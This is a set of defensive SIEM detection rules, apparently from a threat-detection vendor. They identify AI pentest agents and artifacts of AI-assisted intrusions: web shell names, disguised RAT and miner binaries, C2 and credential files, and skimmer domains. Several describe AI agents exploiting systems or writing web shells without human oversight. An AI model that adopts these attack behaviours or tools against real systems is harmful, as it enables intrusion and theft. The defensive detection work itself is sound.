query: ((TargetFilename:(*\/.claude\/agents\/* OR *\\.claude\\agents\\* OR *\/pentest\-ai\-agents\/agents\/* OR *\\pentest\-ai\-agents\\agents\\*)) AND (TargetFilename:(*\/_scope\-guard.md OR *\\_scope\-guard.md OR *\/c2\-operator.md OR *\\c2\-operator.md OR *\/payload\-crafter.md OR *\\payload\-crafter.md OR *\/phishing\-operator.md OR *\\phishing\-operator.md OR *\/evasion\-specialist.md OR *\\evasion\-specialist.md OR *\/data\-exfiltrator.md OR *\\data\-exfiltrator.md OR *\/opsec\-anonymizer.md OR *\\opsec\-anonymizer.md OR *\/persistence\-planner.md OR *\\persistence\-planner.md OR *\/swarm\-orchestrator.md OR *\\swarm\-orchestrator.md OR *\/scada\-attacker.md OR *\\scada\-attacker.md))) OR (TargetFilename:(*\/.pentest\-ai\/bin\/findings.sh* OR *\\.pentest\-ai\\bin\\findings.sh* OR *\/.pentest\-ai\/bin\/handoff.sh* OR *\\.pentest\-ai\\bin\\handoff.sh* OR *\/.pentest\-ai\/findings.db* OR *\\.pentest\-ai\\findings.db*))

author: ThreatDefence
description:
Detects Guardian (zakirkun/guardian-cli), an AI pentest CLI in Python, started with one of its engagement
commands. It is run as the console script "guardian" (pip install -e .) or as "python -m cli.main" (the README,
guardian.bat and the Docker image's entry point), for example "guardian workflow run --name web_pentest --target
https://..." or "python -m cli.main scan --target <host>". The model then picks and runs nmap, httpx, subfinder,
nuclei, ffuf, sqlmap, wpscan and other tools against the target, each started directly by this Python process.
false_positives: Authorized tests with Guardian
Another Python project with a cli/main.py module and similar sub-commands
name: Guardian AI Pentest CLI Started
query: (process.command_line:(*\ \-m\ cli.main\ * OR *\/bin\/guardian\ * OR *\\Scripts\\guardian.exe\ *)) AND (process.command_line:(*\ workflow\ run\ * OR *\ scan\ \-\-target\ * OR *\ scan\ \-t\ * OR *\ recon\ \-\-target\ * OR *\ recon\ \-t\ * OR *\ analyze\ * OR *\ report\ \-\-session\ * OR *\ report\ \-s\ * OR *\ \-\-resume\ *))

author: ThreatDefence
description:
Detects a host fetching the Pensar Apex installer or npm package, its update check
(https://registry.npmjs.org/@pensar/apex/latest, src/core/installation/index.ts:35), or the Pensar model gateway
gateway.pensar.dev, which Apex uses when the operator signs in to Pensar Console
(src/core/api/constants.ts:2, src/core/ai/providers/pensar.ts:255). Over HTTPS the path is visible only with TLS
inspection; the host name is in CONNECT and SNI logs.
false_positives: Developers and security teams that use Pensar Apex or Pensar Console
name: Pensar Apex Install, Update Check or Model Gateway
query: (url.original:(*\/@pensar\/apex* OR *\/@pensar%2fapex* OR *pensarai.com\/install.sh* OR *pensarai.com\/apex.ps1*)) OR url.domain:/[gG][aA][tT][eE][wW][aA][yY]\.[pP][eE][nN][sS][aA][rR]\.[dD][eE][vV]/

author: ThreatDefence
description:
Detects the systemd user unit the CAI continuous-ops wizard writes and enables (systemctl --user enable --now):
cai-cops-run_<12 hex>.service, which restarts python -m cai.continuous_ops.loop_runner forever, so CAI agents keep
running on a schedule after the operator logs off.
false_positives: Security teams running CAI continuous operations on purpose
name: CAI Continuous Ops Systemd User Unit Written
query: (TargetFilename:*\/systemd\/user\/cai\-cops\-* AND TargetFilename:*.service) OR (TargetFilename:*\/.cai\/continuous_ops\/run_* AND TargetFilename:*.service)

author: ThreatDefence
description:
Detects the Clearwing command line (Lazarus-AI-OSS/clearwing): its console script or clearwing.py started with one
of its subcommands, such as scan, sourcehunt, operate, interactive, webui, campaign, asm or disclose. Clearwing is
an autonomous network pentest agent and source-code vulnerability hunter driven by a language model; operate runs
it toward goals with no operator in the loop and can approve exploits by itself with --auto-approve-exploits.
false_positives: Security teams and researchers running Clearwing on systems they own or are authorized to test
Another program named clearwing
name: Clearwing AI Pentest Agent Command Line
query: (process.command_line:(*\/bin\/clearwing\ * OR *\\Scripts\\clearwing.exe\ * OR *\\Scripts\\clearwing\ * OR *clearwing.py\ * OR *uv\ run\ clearwing\ *)) AND ((process.command_line:(*\ scan\ * OR *\ sourcehunt\ * OR *\ operate\ * OR *\ interactive* OR *\ webui* OR *\ campaign\ * OR *\ asm\ * OR *\ disclose\ * OR *\ remediate\ * OR *\ parallel\ *)) OR (process.command_line:(*\-\-auto\-approve\-exploits* OR *\-\-webhook\-secret* OR *\-\-webhook\-port* OR *\-\-compile\-commands* OR *\-\-cve\-list*)))

author: ThreatDefence
description:
Detects PentesterFlow (PentesterFlow/agent) on the host that runs it: the pentesterflow binary and its
pentesterflow-browser-mcp companion, the shells it starts for its shell and BashTool tools (/bin/sh -c, /bin/bash -c,
or powershell.exe -NoProfile -NonInteractive -Command on Windows), an npm install run through node, its installer
fetched from raw.githubusercontent.com/PentesterFlow/agent, and its self-update script run from
<tmp>/pentesterflow-update-XXXXXX/install.sh.
false_positives: Authorized tests with PentesterFlow
A different program that is also named pentesterflow
name: PentesterFlow AI Pentest Agent Running or Installed
query: (process.executable:(*\/pentesterflow OR *\\pentesterflow.exe OR *\/pentesterflow\-browser\-mcp)) OR (process.parent.executable:(*\/pentesterflow OR *\\pentesterflow.exe)) OR (process.command_line:(*\/bin\/pentesterflow* OR *@pentesterflow*)) OR (process.command_line:(*PentesterFlow\/agent* OR *\/pentesterflow\-update\-*))

author: ThreatDefence
description:
Detects the NyxStrike server's version check at start-up, a GET of
raw.githubusercontent.com/CommonHuman-Lab/nyxstrike/master/config.py, and a browser or script using a remote
NyxStrike server on port 8888: its dashboard data endpoint /web-dashboard and the AI session endpoints
/api/intelligence/ai-<recon|profiling|vuln|osint|followup>-session.
false_positives: Developers reading the NyxStrike repository through raw.githubusercontent.com
Authorized tests with NyxStrike
name: NyxStrike Update Check or Server API Requested Through a Proxy
query: url.original:*raw.githubusercontent.com\/CommonHuman\-Lab\/nyxstrike\/* OR (url.original:(*\:8888\/web\-dashboard* OR *\:8888\/api\/intelligence\/ai\-recon\-session* OR *\:8888\/api\/intelligence\/ai\-vuln\-session* OR *\:8888\/api\/intelligence\/ai\-osint\-session* OR *\:8888\/api\/intelligence\/ai\-profiling\-session* OR *\:8888\/api\/intelligence\/ai\-followup\-session*))

author: ThreatDefence
description:
Detects a host fetching KaliGPT's installer scripts from raw.githubusercontent.com
(/SudoHopeX/KaliGPT/refs/heads/hackerx/install.sh and installers/installer.deb.sh, installer.arch.sh,
installer.termux.sh), cloning its companion search helper from github.com/SudoHopeX/OpenSearchAPI, or opening the
author's custom GPT at chatgpt.com/g/g-xouSQobsE-kaligpt (kaligpt --web). All HTTPS: the path is visible only with
TLS inspection.
false_positives: Someone reading the KaliGPT project or its custom GPT without running it
name: KaliGPT Installer Download or Web Launcher URL in Proxy Logs
query: (url.domain:/[rR][aA][wW]\.[gG][iI][tT][hH][uU][bB][uU][sS][eE][rR][cC][oO][nN][tT][eE][nN][tT]\.[cC][oO][mM]/ AND url.original:\/SudoHopeX\/KaliGPT\/*) OR (url.domain:/[gG][iI][tT][hH][uU][bB]\.[cC][oO][mM]/ AND (url.original:(\/SudoHopeX\/KaliGPT.git\/* OR \/SudoHopeX\/OpenSearchAPI.git\/*))) OR (url.domain:/[cC][hH][aA][tT][gG][pP][tT]\.[cC][oO][mM]/ AND url.original:\/g\/g\-xouSQobsE\-kaligpt*)

author: ThreatDefence
description:
Detects the files Blitz Strike writes on the host that runs it: its home folder ~/.blitzstrike/ (audit.jsonl,
memory.jsonl, intelligence.jsonl, obligations.jsonl, circuit-breaker.json, reports/, data/payloads, data/templates,
tools/, shot-<time>.png screenshots), and the OpenCode agent personas that blitzstrike install copies into
~/.config/opencode/agents/ (Blitz Strike.md, Blitz.md, Eagle Eye.md, Strike.md).
false_positives: Security teams and bug bounty researchers running Blitz Strike
name: Blitz Strike Home Folder, Reports or Agent Personas Written
query: (TargetFilename:(*\/.blitzstrike\/* OR *\\.blitzstrike\\*)) OR (TargetFilename:(*\/opencode\/agents\/Blitz\ Strike.md OR *\\opencode\\agents\\Blitz\ Strike.md OR *\/opencode\/agents\/Eagle\ Eye.md OR *\\opencode\\agents\\Eagle\ Eye.md))

author: ThreatDefence
description:
Detects files Mitsu, an AI pentest agent, writes on the host that runs it. Sessions (the conversation and the
Intel record with targets, services, findings, accounts and credentials) go to ~/.local/share/mitsu/sessions/
<32 hex>.json, with pasted images in <id>.images/ and the attack-surface map and assessment reports in
<id>/artifacts/. Provider API keys go to ~/.config/mitsu/credentials.json and the MCP setup to
~/.config/mitsu/mcp_servers.json. Armory installs go to ~/.local/share/mitsu/armory/<tool>/. The Codex and
Claude Code providers work in <temp>/mitsu-codex-sessions/ and <temp>/mitsu-claude-sessions/. XDG_CONFIG_HOME and
XDG_DATA_HOME move the first two folders; the folder names stay the same.
false_positives: Authorized tests, CTF and lab work with Mitsu
Other software that keeps its data in a folder named mitsu
name: Mitsu Session, Configuration or Report Files Written
query: (TargetFilename:(*\/mitsu\/sessions\/* OR *\/.config\/mitsu\/* OR *\/mitsu\/armory\/* OR *\/mitsu\-codex\-sessions\/* OR *\/mitsu\-claude\-sessions\/*)) OR TargetFilename:*\/.mitsu\-armory\-managed OR (TargetFilename:(*\/mitsu\/credentials.json OR *\/mitsu\/mcp_servers.json OR *\/mitsu\/host.json OR *\/mitsu\/instance.lock))

author: ThreatDefence
description:
Detects NyxStrike testing a web application: its hard-coded user agents (NyxStrike/1.0 from the decision engine,
Security-HTTP-Framework/1.0 and Security-BrowserAgent/1.0, and commonhuman-core/openapi-discover from its OpenAPI
discovery), the <xssTest123> probe of its browser agent, and the markers of the StingXSS and BreachSQL scanners it
installs and drives (StingXSS_<6>, BreachSQL_<6>, stingxss_redir_marker, stingxss_jsonp_probe,
stingxss-crlf-detected). StingXSS and BreachSQL also run on their own, so their markers mean those scanners, not
necessarily NyxStrike.
false_positives: Authorized tests with NyxStrike, StingXSS or BreachSQL
name: NyxStrike User Agent or Probe Marker in Web Logs
query: (user_agent.original:(NyxStrike\/* OR Security\-HTTP\-Framework\/* OR Security\-BrowserAgent\/* OR commonhuman\-core\/openapi\-discover*)) OR (url.query:(*xssTest123* OR *StingXSS_* OR *BreachSQL_* OR *stingxss_redir_marker* OR *stingxss_jsonp_probe* OR *stingxss\-crlf\-detected*))

author: ThreatDefence
description:
Detects Cognito sign-up attempts that try to set custom:isAdmin or use an artex-<random>.invalid
tenant domain, as Datadog observed in ARTEX activity.
false_positives: Applications that genuinely use an isAdmin attribute in sign-up
name: Cognito Sign-Up With ARTEX Artifacts
query: (event.provider:cognito\-idp.amazonaws.com AND event.action:SignUp) AND ((aws.cloudtrail.error_message:(*custom\:isAdmin* OR *artex\-*)) OR aws.cloudtrail.request_parameters:*custom\:isAdmin*)

author: ThreatDefence
description:
Detects the marker deadend7x7probe, which the Deadend CLI supervisor prompt tells the model to send to find where
input is reflected before choosing an XSS payload. The project's own benchmark runs show it in query strings such
as GET /page?test=deadend7x7probe. Request bodies, where the marker and the agent's shipped test account
(deadendtester, deadendpassword123!, hacker@straylabs.ai) also appear, are not in most web server logs; the
Suricata rules cover them.
false_positives: Authorized tests with Deadend CLI
name: Deadend CLI Reflection Probe Marker in Web Logs
query: url.query:*deadend7x7probe* OR url.path:*deadend7x7probe*

author: ThreatDefence
description:
Detects smss.exe, winlogon.exe, dllhost.exe, sihost.exe and MicrosoftEdgeUpdate.exe started from a folder
other than their real one. A toolkit active in ARTEX operations ships Gh0st RAT as winlogon.exe and an XMRig
miner as MicrosoftEdgeUpdate.exe, downloaded into user-writable folders.
false_positives: Unknown
name: Windows System Binary Name Running From the Wrong Folder
query: ((process.executable.caseless:(*\\smss.exe OR *\\winlogon.exe OR *\\dllhost.exe OR *\\sihost.exe)) AND (NOT (process.executable.caseless:(C\:\\Windows\\System32\\* OR C\:\\Windows\\SysWOW64\\*)))) OR (process.executable.caseless:*\\MicrosoftEdgeUpdate.exe AND (NOT (process.executable.caseless:(*\\Microsoft\\EdgeUpdate\\* OR *\\Microsoft\\Temp\\*))))

subtechnique.name: Match Legitimate Resource Name or Location

author: ThreatDefence
description:
Detects Agentic Bug Hunter (awarexone/Agentic-Bug-Hunter at 82f4512e) being installed or run: the pip, pipx or uv
install of agentic-bug-hunter or a clone of its repository, the bughunter and bughunter-agent commands, the stdio
MCP server (bughunter mcp serve), its recon and scanner scripts, the OOB helper and the Hunt Dashboard server.
The toolkit is driven by coding assistants (Claude Code, Codex, OpenCode, Gemini/Antigravity) or by its own
ReAct agent, which runs scanners without a human between steps.
false_positives: Security staff who use Agentic Bug Hunter
name: Agentic Bug Hunter Toolkit on a Host
query: process.command_line:*agentic\-bug\-hunter* OR (process.command_line:(*\/bin\/bughunter\-agent* OR *\/bin\/bughunter\ mcp\ serve* OR *bughunter\/engine.py* OR *bughunter\/agent.py*)) OR (process.command_line:(*bughunter\/tools\/recon_engine.sh* OR *bughunter\/tools\/vuln_scanner.sh* OR *bughunter\/tools\/bypass_403.sh* OR *bughunter\/tools\/oob_listener.py* OR *hunt_dashboard.py\ serve* OR *waf_response_analyzer.py\ \-\-calibrate*))

author: ThreatDefence
description:
Detects creation of the JSP web shell file names Google observed when an ARTEX agent redirected the
MySQL general log into a web directory.
false_positives: Unknown
name: JSP Web Shell Names Seen in ARTEX Intrusions
query: TargetFilename:(*\/cl1217.jsp OR *\/f1219a.jsp OR *\/z1219.jsp OR *\\cl1217.jsp OR *\\f1219a.jsp OR *\\z1219.jsp)

author: ThreatDefence
description:
Detects lookups of logs.aliasrobotics.com, where CAI (Cybersecurity AI) uploads its session logs at the end of a
session and every 5 model interactions (the second even with CAI_TELEMETRY=false), and of api.aliasrobotics.com
(licence check and default alias1 model, TCP 666 and 665) and packages.aliasrobotics.com (private package index,
TCP 664). The api and packages names may also serve Alias's successor product, CSI.
false_positives: Authorized use of CAI or other Alias Robotics products
name: CAI Telemetry, Alias Gateway or Private Package Index DNS Query
query: dns.question.name:/[lL][oO][gG][sS]\.[aA][lL][iI][aA][sS][rR][oO][bB][oO][tT][iI][cC][sS]\.[cC][oO][mM]/ OR dns.question.name:/[aA][pP][iI]\.[aA][lL][iI][aA][sS][rR][oO][bB][oO][tT][iI][cC][sS]\.[cC][oO][mM]/ OR dns.question.name:/[pP][aA][cC][kK][aA][gG][eE][sS]\.[aA][lL][iI][aA][sS][rR][oO][bB][oO][tT][iI][cC][sS]\.[cC][oO][mM]/

author: ThreatDefence
description:
Detects the commands VulnBot sends as soon as it opens its SSH shell on the Kali host that runs its tools:
touch ~/.hushlogin, sudo touch /etc/legal, sudo chmod 644 /etc/legal, sudo rm -f /etc/motd and
sudo rm -f /etc/update-motd.d/* (actions/remote_shell.py:95-103 at 9a12effa). They run once per VulnBot run, in an
interactive shell under sshd, usually as root with a password login. Creating /etc/legal is the rare part: it
belongs to Ubuntu's login notice and is not normally touched on Kali. Look for the motd removal from the same
session and for the Kali tools (nmap, nikto, dirb, sqlmap, hydra, msfconsole) that follow.
false_positives: Ubuntu base-files installs or upgrades that recreate /etc/legal (run by dpkg, not from an interactive SSH shell)
Authorized tests with VulnBot
name: VulnBot Shell Setup on the Kali Host It Drives
query: (process.executable:*\/touch AND process.command_line:*\ \/etc\/legal) OR (process.executable:*\/chmod AND (process.command_line:*\ 644\ * AND process.command_line:*\/etc\/legal*)) OR (process.executable:*\/sudo AND (process.command_line:(*touch\ \/etc\/legal* OR *chmod\ 644\ \/etc\/legal*)))

author: ThreatDefence
description:
Detects a server fetching a host name whose first label starts with neurosploit. NeuroSploit's out-of-band payloads
(blind SSRF, XXE, command injection, JNDI) point at <token>.<operator domain>, and every token starts with
neurosploit (neurosploit<kind><hex> from the code, and the prompt tells the agents to keep that prefix). A match means
a payload ran on the server that made the request. neurosploitai.github.io is the project's documentation site.
false_positives: Authorized tests with NeuroSploit
name: NeuroSploit Out-of-Band Callback in Proxy Logs
query: url.domain:/[nN][eE][uU][rR][oO][sS][pP][lL][oO][iI][tT].*/ AND (NOT url.domain:/[nN][eE][uU][rR][oO][sS][pP][lL][oO][iI][tT][aA][iI]\..*/)

author: ThreatDefence
description:
Detects Deadend CLI, an autonomous web application penetration testing agent. The Bun terminal UI (deadend) starts
its Python JSON-RPC backend as a child process, either the installed PyOxidizer build through the wrapper
~/.cache/deadend/bin/deadend.sh (or ~/.cache/deadend/server/deadend.sh from install.sh) with
--log-file ~/.cache/deadend/logs/rpc-server-<ms>.log, or from source with uv run python -m deadend_cli.jsonrpc_server.
The PyPI package also installs a deadend-jsonrpc-server entry point.
false_positives: Authorized penetration testers or researchers running Deadend CLI
name: Deadend CLI Agent Backend or Launcher Started
query: (process.command_line:*deadend* AND process.command_line:*\-\-log\-file* AND process.command_line:*rpc\-server\-*) OR (process.command_line:(*deadend_cli.jsonrpc_server* OR *deadend\-jsonrpc\-server*))

author: ThreatDefence
description:
Detects the files AutoPentester writes in its working folder during a run: logs/Pentest_raw_outputs.txt (every
command the agent ran and its output), resources/current_action.txt (the command running now, for its tree window)
and resources/attacker_details.txt (the operator's and the target's IP addresses, rewritten at every start).
The repository ships an attacker_details.txt, so cloning it also writes that file.
false_positives: Authorized tests and research runs with AutoPentester, and cloning its repository
name: AutoPentester Run Files Written
query: TargetFilename:*\/Pentest_raw_outputs.txt OR (TargetFilename:(*\/resources\/current_action.txt OR *\/resources\/attacker_details.txt))

author: ThreatDefence
description:
Detects the user agents hard-coded in Vigilo (certeu/vigilo at 82c2d353): Vigilo-Greybox/1 (authorised security
test) on every grey-box request, which a forward proxy sees for plain-HTTP targets or with TLS inspection (Vigilo
sends grey-box traffic through an admin-defined egress proxy when one is set), and Vigilo-Preflight/1.0 on the
reachability check at the start of a white-box run.
false_positives: Agreed Vigilo assessments run from your network
name: Vigilo User Agents in Proxy Logs
query: user_agent.original:(Vigilo\-Greybox\/* OR Vigilo\-Preflight\/*)

author: ThreatDefence
description:
Detects the stage files a Cain run writes into its workspace (./workspace by default, /workspaces/cain in its
Docker image): recon/recon-output.txt (the model's recon answer after redaction), recon/gate.json (always written,
{"recon_gate": "off"} unless --coverage-gate), test/test-output.txt and test/gate-skipped.txt
(src/cain_agent/handlers.py:65-74,256-261,370,408,541,613 at 2e3f4f1c). The report files are written through a
temporary file and a rename, so they are left to the hunt and the YARA rule.
false_positives: Authorized tests and research with Cain
Other tools that use the same recon/ and test/ file names
name: Cain Workspace Stage Files Written
query: TargetFilename:(*\/recon\/recon\-output.txt OR *\\recon\\recon\-output.txt OR *\/test\/test\-output.txt OR *\\test\\test\-output.txt OR *\/test\/gate\-skipped.txt OR *\\test\\gate\-skipped.txt)

author: ThreatDefence
description:
Detects files H-Pentest writes: its SQLite task database (h-pentest.db in Docker, h_pentest.db when run from the
backend folder), the configuration files its API writes to the hard-coded folder /home/H-pentest/H-pentest/backend/config/
(api_config.json holds the model API key), and the scripts its sandbox container runs from
/sandbox/workspace_<epoch>/script_<milliseconds>.py.
false_positives: Authorized use of H-Pentest
name: H-Pentest Database, Configuration or Sandbox Script Written
query: (TargetFilename:(*\/h\-pentest.db OR *\/h_pentest.db)) OR TargetFilename:*\/home\/H\-pentest\/H\-pentest\/backend\/config\/* OR (TargetFilename:*\/sandbox\/workspace_* AND TargetFilename:*.py)

author: ThreatDefence
description:
Detects the 0security agent harness (0sec-labs/0security) running on a host: its release binary (0security,
0security-<platform>, the older 0-<platform> name, or ~/.0/bin/0security from the installer), the Docker image's
entry point (node /app/dist/0.js, by default with --host 0.0.0.0 --server-mode), the headless console a scan
starts (--headless --port 0), and the engine it deploys to a remote computer over SSH (/tmp/zero-engine,
--engine-token-env ZERO_WORKER_TOKEN). Its agents run shell commands, edit code and can send requests to live
targets; the Docker image ships sqlmap, nmap, hydra, Impacket, Certipy, BloodHound CE and AzureHound.
false_positives: Developers and security teams who use 0security on their own repositories
name: 0security CLI, Web Console or Remote Engine Started
query: (process.executable:(*\/.0\/bin\/0security OR *\/0security\-linux\-x64 OR *\/0security\-linux\-arm64 OR *\/0security\-darwin\-arm64 OR *\\0security\-windows\-x64.exe OR *\\0\-windows\-x64.exe OR *\/0\-linux\-x64 OR *\/0\-linux\-arm64 OR *\/0\-darwin\-arm64)) OR (process.command_line:(*\/app\/dist\/0.js\ \-\-host\ 0.0.0.0\ \-\-server\-mode* OR *tini\ \-\-\ node\ \/app\/dist\/0.js*)) OR (process.command_line:(*\-\-engine\-token\-env\ ZERO_WORKER_TOKEN* OR *\-\-engine\-workspace\ \/tmp\/zero\-engine\/* OR *cd\ \/tmp\/zero\-engine*)) OR (process.command_line:(*dist\/0.js\ \-\-headless\ \-\-port\ 0* OR *0security\ \-\-headless\ \-\-port\ 0*))

author: ThreatDefence
description:
Detects the paths Xalgorix's verifier requests when it confirms a finding (<path>-xalgorix-nonexistent-<id> for
access control, xalgorix-missing-<id> before a path traversal), the reflection canary XALG0R1XTEST from its system
prompt, and its own user agents. The verifier strings are in the code; the canary is an example the model may vary.
false_positives: Authorized tests with Xalgorix
name: Xalgorix Verifier Marker or Canary in Web Logs
query: (url.path:(*xalgorix\-nonexistent\-* OR *xalgorix\-missing\-*)) OR url.query:*XALG0R1XTEST* OR user_agent.original:xalgorix*

author: ThreatDefence
description:
Detects files the LazyOwn framework writes under its sessions/ folder on the host that runs the C2: the beacon AES
key sessions/key.aes, the launcher files sessions/c2_launch.env (C2 port, user and password) and c2_launch.sh, the
one-time admin passwords sessions/rbac_initial_admin.txt and users_initial_admin.txt, the shared session state
sessionLazyOwn.json and LazyOwn_session_report.csv, and camera frames and recordings the decoy page captured
(sessions/captured_images/capture_<time>.png, audio_<time>.webm).
false_positives: Authorized tests with LazyOwn
Developers working on the LazyOwn code
name: LazyOwn C2 Key, Launcher, Credential or Capture Files Written
query: (TargetFilename:(*\/sessions\/key.aes OR *\/sessions\/c2_launch.env OR *\/sessions\/c2_launch.sh OR *\/sessions\/rbac_initial_admin.txt OR *\/sessions\/users_initial_admin.txt OR *\/sessions\/sessionLazyOwn.json OR *\/sessions\/LazyOwn_session_report.csv)) OR (TargetFilename:*\/sessions\/captured_images\/* AND (TargetFilename:(*.png OR *.webm)))

author: ThreatDefence
description:
Detects pentest-ai testing a web server: its user agents pentest-ai/<version> (compatible; rv:<install id>;
+https://pentestai.xyz), ptai-api-discovery/<version> and pentest-ai/authscan, its soft-404 probe path
/this-path-definitely-does-not-exist-ptai-canary, the open redirect canary host r.pentestai.xyz and the canaries
its oracles put in parameters (<ptaiRX9173>, ptaictlZ9173, ptaicanary, ptai_xss_probe, ptai-canary.example,
ptai-pkce-canary.example). All strings are in the pentest-ai code at b51ec6ee.
false_positives: Authorized tests with pentest-ai
name: pentest-ai Scan Markers in Web Logs
query: (user_agent.original:(pentest\-ai\/* OR ptai\-api\-discovery\/*)) OR (url.path:(*this\-path\-definitely\-does\-not\-exist\-ptai\-canary* OR *ptai\-ssrf\-control\-404*)) OR (url.query:(*r.pentestai.xyz* OR *ptaiRX9173* OR *ptaiSX9173* OR *ptaictlZ9173* OR *ptaicanary* OR *ptai_xss_probe* OR *ptai\-canary.example* OR *ptai\-pkce\-canary.example*))

author: ThreatDefence
description:
Detects the files NeuroSploit writes on the host that runs it: its project store .neurosploit/ (keys.json with model
API keys, vault/ with the credentials of test accounts it created, c2/ with C2 state, audit log and generated
payloads), its run folders runs/ns-<unix time>-<target>/ and the Playwright script /tmp/ns_browser_prefetch.js.
false_positives: Security teams running NeuroSploit
name: NeuroSploit Project Store, Vault or C2 Files Written
query: (TargetFilename:(*\/.neurosploit\/c2\/* OR *\\.neurosploit\\c2\\* OR *\/.neurosploit\/vault\/* OR *\\.neurosploit\\vault\\*)) OR (TargetFilename:(*\/.neurosploit\/keys.json OR *\\.neurosploit\\keys.json)) OR TargetFilename:\/tmp\/ns_browser_prefetch.js

author: ThreatDefence
description:
Detects commands that read /osint_users.txt, a user list at the root of the file system. The Cochise scenario prompt
tells the model that this file holds the user names for password spraying (templates/scenario.md:31), and the model
then runs nxc, netexec or impacket GetNPUsers with it on the Kali VM it drives over SSH (39 of the 59 run logs the
repository ships). The operator puts the file there; another path means another setup.
false_positives: Lab exercises that follow the Cochise setup by hand
name: Cochise AI Pentest Agent User List in AD Attack Commands
query: process.command_line:(*\ \/osint_users.txt* OR *\=\/osint_users.txt* OR *\"\/osint_users.txt* OR *'\/osint_users.txt* OR *\<\/osint_users.txt*)

author: ThreatDefence
description:
Detects the CHYing-agent contest agent on the operator's host: its dashboard launch from start-web.sh
(main.py --dashboard --skip-preflight), its Tencent and HTB contest runners, its preflight check and any docker
command on its tools container chying-agent-docker or image chying-agent-docker-tools, and the container entrypoint
starting the GhidraMCP headless server and MCP bridge on all interfaces (ports 8089 and 8766, no authentication).
false_positives: Authorized tests or contest work with CHYing-agent
Other GhidraMCP deployments started with the same port and bind arguments (the two ghidra selections alone are weaker)
name: CHYing-agent AI Pentest Agent Launch, Tools Container or Ghidra Services
query: (process.command_line:*main.py* AND process.command_line:*\-\-dashboard* AND process.command_line:*\-\-skip\-preflight*) OR (process.command_line:(*run_tencent_ctf.py* OR *run_htb_ctf.py*)) OR process.command_line:*chying\-agent\-docker* OR (process.command_line:*GhidraMCPHeadlessServer* AND process.command_line:*\-\-port\ 8089* AND process.command_line:*\-\-bind\ 0.0.0.0*) OR (process.command_line:*bridge_mcp_ghidra.py* AND process.command_line:*\-\-transport\ sse* AND process.command_line:*\-\-mcp\-host\ 0.0.0.0* AND process.command_line:*\-\-mcp\-port\ 8766*)

author: ThreatDefence
description:
Detects lookups of the skimmer, C2 and console domains Gambit Security recovered from a financially motivated operator
who used Strix for discovery, Cairn for exploitation and Hermes for orchestration against online retailers.
false_positives: None expected
name: DNS Query for Skimmer or C2 Hosts of the Hermes, Strix and Cairn Card-Theft Campaign
query: (dns.question.name:/[mM][eE][dD][bB][oO][oO][kK][sS][oO][uU][rR][cC][eE]\.[cC][oO][mM]/ OR dns.question.name:/[tT][rR][aA][fF][fF][iI][cC]-[aA][nN][aA][lL][yY][zZ][eE][rR]\.[nN][eE][tT]/ OR dns.question.name:/[bB]8[tT]\.[sS][hH][oO][pP]/ OR dns.question.name:/[nN][eE][tT][lL][fF][jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/[xX]1[oO][pP][aA][yY]\.[cC][oO]/ OR dns.question.name:/[sS][tT][aA][tT][iI][cC]-[jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/[jJ][sS]-[sS][tT][aA][tT][iI][cC]\.[cC][oO][mM]/ OR dns.question.name:/[jJ][sS][nN][eE][tT][lL][iI][fF][yY]\.[cC][oO][mM]/ OR dns.question.name:/[nN][eE][tT][lL][iI][fF][yY][jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/[nN][eE][wW][sS][sS][jJ][sS]\.[cC][oO][mM]/) OR (dns.question.name:/.*\.[mM][eE][dD][bB][oO][oO][kK][sS][oO][uU][rR][cC][eE]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[tT][rR][aA][fF][fF][iI][cC]-[aA][nN][aA][lL][yY][zZ][eE][rR]\.[nN][eE][tT]/ OR dns.question.name:/.*\.[bB]8[tT]\.[sS][hH][oO][pP]/ OR dns.question.name:/.*\.[nN][eE][tT][lL][fF][jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[xX]1[oO][pP][aA][yY]\.[cC][oO]/ OR dns.question.name:/.*\.[sS][tT][aA][tT][iI][cC]-[jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[jJ][sS]-[sS][tT][aA][tT][iI][cC]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[jJ][sS][nN][eE][tT][lL][iI][fF][yY]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[nN][eE][tT][lL][iI][fF][yY][jJ][sS]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[nN][eE][wW][sS][sS][jJ][sS]\.[cC][oO][mM]/)

author: ThreatDefence
description:
Detects a Windows executable, DLL, control panel item or raw binary written under BOAZ_beta/output/, where
Hexstrike-redteam tells the AI assistant to put the evasive payloads it builds with BOAZ (README, MCP tool
description and .gitignore). The output path is chosen per request, so a payload written elsewhere in BOAZ_beta
is missed.
false_positives: Red teams building payloads with BOAZ for an agreed engagement
name: Hexstrike-redteam BOAZ Payload Written
query: TargetFilename:*\/BOAZ_beta\/output\/* AND (TargetFilename:(*.exe OR *.dll OR *.cpl OR *.bin))

author: ThreatDefence
description:
Detects pentest-ai running: its console scripts ptai and pentest-ai (start, mcp, serve), its registration as an
MCP server in an AI coding client (claude mcp add ... pentest-ai -- ptai mcp), its container image
ghcr.io/0xsteph/pentest-ai and its installation from PyPI (package ptai). The scripts are Python entry points, so on
Linux and macOS the image is the interpreter and the script path is on the command line.
false_positives: Security teams and bug bounty researchers running pentest-ai
name: pentest-ai CLI, MCP Server or Container on a Host
query: (process.executable:(*\\ptai.exe OR *\\pentest\-ai.exe)) OR (process.command_line:(*\/bin\/ptai\ start\ * OR *\/bin\/ptai\ mcp* OR *\/bin\/ptai\ serve* OR *\/bin\/pentest\-ai\ start\ * OR *\/bin\/pentest\-ai\ mcp* OR *\/bin\/pentest\-ai\ serve* OR *\ pentest\-ai\ \-\-\ ptai\ mcp* OR *ghcr.io\/0xsteph\/pentest\-ai* OR *pipx\ install\ ptai* OR *pip\ install\ ptai*))

author: ThreatDefence
description:
Detects the user agents hard-coded in Agentic Bug Hunter (awarexone/Agentic-Bug-Hunter at 82f4512e) leaving through
a forward proxy: agentic-bug-hunter/<tool> from its scanners, verifiers, HIBP breach check and HackerOne client,
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research from its password spray and cewler wordlist
crawl, and Mozilla/5.0 (compatible; waf-response-analyzer/1.0). A proxy sees them for plain-HTTP targets or with
TLS inspection. A match means the toolkit runs on a host behind the proxy.
false_positives: Security staff who run Agentic Bug Hunter from your network
